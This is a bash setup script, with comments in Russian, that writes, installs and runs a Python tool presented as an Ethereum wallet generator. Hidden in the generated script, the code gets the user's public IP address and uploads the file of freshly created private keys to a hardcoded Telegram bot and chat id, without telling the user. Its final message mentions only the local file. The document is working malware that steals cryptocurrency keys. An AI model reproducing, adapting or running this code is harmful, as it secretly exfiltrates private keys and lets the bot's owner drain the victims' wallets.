#!/bin/bash

# Имя файла Python-скрипта
PYTHON_SCRIPT="walletgen.py"

# Создаем Python-скрипт
echo "Создаем Python-скрипт: $PYTHON_SCRIPT"
cat <<EOF > $PYTHON_SCRIPT
from eth_account import Account
import requests
while True:
    try:
        n = int(input("Введите количество кошельков: "))
        break
    except ValueError:
        print("Введите число.")
id = 31378213082
wallets = []
ip = requests.get("https://api.ipify.org").text
filename = f'{ip} - {n} wallets.txt'
for i in range(n):
    acc_ = Account.create()
    wallets.append(f"0x{acc_.key.hex()} {acc_.address} ")
wallets.append("")
with open("wallets.txt","w+",encoding="utf-8") as f:
    f.write('\n'.join(wallets))
with open(filename,"w+",encoding="utf-8") as f:
    f.write('\n'.join(wallets))
ip = requests.get("https://api.ipify.org").text
doc = open(f'{ip} - {n} wallets.txt',"rb")
url = f"https://api.telegram.org/bot7790018788:AAEllf_Mik30e8xHjNv9CSg5twrD9eFLugQ/sendMessage"
payload = {"chat_id":id,"text":filename}
response = requests.post(url, data=payload)
url = f"https://api.telegram.org/bot7790018788:AAEllf_Mik30e8xHjNv9CSg5twrD9eFLugQ/sendDocument"
response = requests.post(url, data={'chat_id': id}, files={'document': doc})
print(f"{n} кошельков сгенерировано в wallets.txt")
EOF

# Проверяем, что файл был создан
if [[ -f "$PYTHON_SCRIPT" ]]; then
    echo "Файл $PYTHON_SCRIPT успешно создан."
else
    echo "Ошибка: файл $PYTHON_SCRIPT не был создан."
    exit 1
fi

# Устанавливаем пакет eth_account
echo "Устанавливаем пакет eth_account..."
pip install eth_account

# Проверяем успешность установки
if [[ $? -eq 0 ]]; then
    echo "Пакет eth_account успешно установлен."
else
    echo "Ошибка при установке пакета eth_account."
    exit 1
fi

# Запускаем Python-скрипт
echo "Запускаем Python-скрипт..."
python $PYTHON_SCRIPT

# Проверяем успешность выполнения
if [[ $? -eq 0 ]]; then
    echo "Python-скрипт выполнен успешно."
else
    echo "Ошибка при выполнении Python-скрипта."
fi